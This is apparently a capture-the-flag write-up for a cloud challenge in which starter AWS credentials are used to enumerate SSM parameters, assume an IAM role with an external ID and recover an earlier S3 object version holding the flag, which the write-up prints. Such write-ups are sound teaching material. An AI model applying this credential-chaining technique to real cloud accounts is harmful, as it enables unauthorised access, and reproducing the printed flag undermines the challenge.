# False Ferry

**Cyber Apocalypse CTF 2026 — Cloud (AWS / LocalStack)**

> The route board says the boat goes to the east road landing, but the crew roster sends it to a dock
> controlled by Vaultrune. Lysa has one job: find the earlier crossing list, prove who changed the dock.

## TL;DR

Clerk AWS creds → **SSM Parameter Store** points at a **versioned S3 manifest** plus a role to assume →
`sts:AssumeRole` (with `ExternalId`) → `ListObjectVersions` → read the **original object version** of the
crossing roster, which carries the flag.

## Recon

Two ports: a Flask **briefing** (`:31076`) and an **AWS endpoint** (`:30411`, returns
`AccessDeniedException`). The briefing says: *"Crossing batch metadata lives in Systems Manager under
`/ferry/crossing/`. Catalog the namespace before you read any parameter value."*

Starting creds are served at `GET :31076/player-creds.json`:

```json
{ "user":"coalition-ferry-clerk", "access_key_id":"AKIA…", "secret_access_key":"…",
  "region":"us-east-1", "endpoint":"http://127.0.0.1:4566" }
```

Point `AWS_ENDPOINT_URL` at `http://154.57.164.82:30411` (the API port, not the briefing port).

## 1. Catalog SSM

`GetParametersByPath` is denied, but `DescribeParameters` is allowed:

```
/ferry/crossing/live-crossing-id      -> "CROSSING-7A3F"
/ferry/crossing/CROSSING-7A3F         (AUTHORIZED)
/ferry/crossing/CROSSING-VOID-*       (VOID / CLOSED / DRAFT decoys)
```

## 2. Read the live crossing

```json
{
  "crossing_id": "CROSSING-7A3F", "status": "AUTHORIZED",
  "scanner_role_arn": "arn:aws:iam::584729103648:role/ferry-crossing-scanner",
  "scanner_external_id": "ferry-crossing-scanner-7a3f",
  "manifest_bucket": "ferry-crossing-manifest",
  "manifest_object_key": "manifests/morning-crossing-order.txt",
  "manifest_version_id": "a02ea35d-3f86-4e79-aacf-80cc3be72305"
}
```

An S3 object with an explicit **version id** → the bucket has **versioning** enabled.

## 3. Assume the scanner role

```python
c = sts.assume_role(RoleArn=scanner_role_arn, RoleSessionName="lysa",
                    ExternalId="ferry-crossing-scanner-7a3f")["Credentials"]
```

## 4. Recover the earlier version

```python
s3.list_object_versions(Bucket="ferry-crossing-manifest",
                        Prefix="manifests/morning-crossing-order.txt")
# -> 3 versions
```

The newer versions point the roster at VOID/DRAFT batches (the swapped dock). The **original version**
`a02ea35d-3f86-4e79-aacf-80cc3be72305` is the untampered release record:

```
CROSSING RELEASE RECORD
Batch: CROSSING-7A3F
Authorized by: Stormbound Coalition Ferry Office
HTB{ferry_crossing_dock_seal_a38d4fc9986475c2c050dacfc15d4346}
```

S3 versioning keeps the original roster around even after the ferry master posts a new one on top — which
is exactly how Lysa proves the dock was changed.

## Flag

```
HTB{ferry_crossing_dock_seal_a38d4fc9986475c2c050dacfc15d4346}
```
